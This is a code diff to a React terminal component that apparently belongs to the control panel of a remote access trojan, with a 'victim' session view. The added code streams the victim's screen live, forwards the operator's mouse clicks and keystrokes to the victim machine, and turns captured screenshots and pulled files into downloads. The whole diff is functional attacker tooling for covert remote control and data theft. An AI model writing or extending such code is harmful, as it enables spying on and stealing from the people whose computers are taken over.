@@ -79,13 +79,17 @@ interface TerminalProps {
   output: string[];
   onCommand: (cmd: string) => void;
   onClear: () => void;
+  liveViewActive?: boolean;
+  liveFrame?: string | null;
+  onRemoteInput?: (action: string, x: number, y: number, key?: string) => void;
 }
 
-export function Terminal({ victim, output, onCommand, onClear }: TerminalProps) {
+export function Terminal({ victim, output, onCommand, onClear, liveViewActive, liveFrame, onRemoteInput }: TerminalProps) {
   const [command, setCommand] = useState("");
   const [history, setHistory] = useState<string[]>([]);
   const [histIdx, setHistIdx] = useState(-1);
   const outputRef = useRef<HTMLDivElement>(null);
+  const liveImgRef = useRef<HTMLImageElement>(null);
   const styles = useStyles();
 
   const ip = victim.id.split(":")[0];
@@ -168,14 +172,95 @@ export function Terminal({ victim, output, onCommand, onClear }: TerminalProps) 
       />
 
       <div ref={outputRef} className={styles.output}>
-        {output.length === 0 ? (
+        {liveViewActive && liveFrame ? (
+          <div style={{ position: "relative", cursor: "crosshair", margin: "4px 0" }}>
+            <img
+              ref={liveImgRef}
+              src={`data:image/jpeg;base64,${liveFrame}`}
+              alt="live view"
+              style={{ maxWidth: "100%", borderRadius: "4px", border: "1px solid #0f0" }}
+              onClick={(e) => {
+                if (!onRemoteInput || !liveImgRef.current) return;
+                const rect = liveImgRef.current.getBoundingClientRect();
+                const natW = liveImgRef.current.naturalWidth;
+                const natH = liveImgRef.current.naturalHeight;
+                const scaleX = natW / rect.width;
+                const scaleY = natH / rect.height;
+                const x = Math.round((e.clientX - rect.left) * scaleX);
+                const y = Math.round((e.clientY - rect.top) * scaleY);
+                onRemoteInput("click", x, y);
+              }}
+              onContextMenu={(e) => {
+                e.preventDefault();
+                if (!onRemoteInput || !liveImgRef.current) return;
+                const rect = liveImgRef.current.getBoundingClientRect();
+                const natW = liveImgRef.current.naturalWidth;
+                const natH = liveImgRef.current.naturalHeight;
+                const scaleX = natW / rect.width;
+                const scaleY = natH / rect.height;
+                const x = Math.round((e.clientX - rect.left) * scaleX);
+                const y = Math.round((e.clientY - rect.top) * scaleY);
+                onRemoteInput("rightclick", x, y);
+              }}
+              onKeyDown={(e) => {
+                if (!onRemoteInput) return;
+                e.preventDefault();
+                onRemoteInput("type", 0, 0, e.key === "Enter" ? "{ENTER}" : e.key === "Backspace" ? "{BACKSPACE}" : e.key === "Tab" ? "{TAB}" : e.key === "Escape" ? "{ESC}" : e.key.length === 1 ? e.key : `{${e.key.toUpperCase()}}`);
+              }}
+              tabIndex={0}
+            />
+            <div style={{
+              position: "absolute", top: 8, right: 8,
+              backgroundColor: "rgba(0,0,0,0.7)", color: "#0f0",
+              padding: "2px 8px", borderRadius: "4px", fontSize: "11px",
+            }}>
+              🔴 LIVE — Click to interact • Type &apos;liveview&apos; to stop
+            </div>
+          </div>
+        ) : liveViewActive ? (
+          <div style={{ color: "#9e9e9e", padding: "20px", textAlign: "center" }}>
+            ⏳ Waiting for live view frames...
+          </div>
+        ) : output.length === 0 ? (
           <span style={{ color: "#555" }}>Session opened. Type a command below.</span>
         ) : (
-          output.map((line, i) => (
-            <div key={i} className={lineClass(line)}>
-              {line}
-            </div>
-          ))
+          output.map((line, i) => {
+            // Render inline screenshot image
+            if (line.startsWith("%%IMG%%")) {
+              const b64 = line.slice(7);
+              return (
+                <div key={i} style={{ margin: "8px 0" }}>
+                  <img
+                    src={`data:image/png;base64,${b64}`}
+                    alt="screenshot"
+                    style={{ maxWidth: "100%", borderRadius: "4px", border: "1px solid #333" }}
+                  />
+                </div>
+              );
+            }
+            // Render file download link
+            if (line.startsWith("%%FILE%%")) {
+              const parts = line.slice(8).split("%%");
+              const filename = parts[0];
+              const b64 = parts[1] || "";
+              return (
+                <div key={i} style={{ margin: "4px 0" }}>
+                  <a
+                    href={`data:application/octet-stream;base64,${b64}`}
+                    download={filename}
+                    style={{ color: "#80d8ff", textDecoration: "underline", cursor: "pointer" }}
+                  >
+                    📥 Download {filename}
+                  </a>
+                </div>
+              );
+            }
+            return (
+              <div key={i} className={lineClass(line)}>
+                {line}
+              </div>
+            );
+          })
         )}
       </div>
 
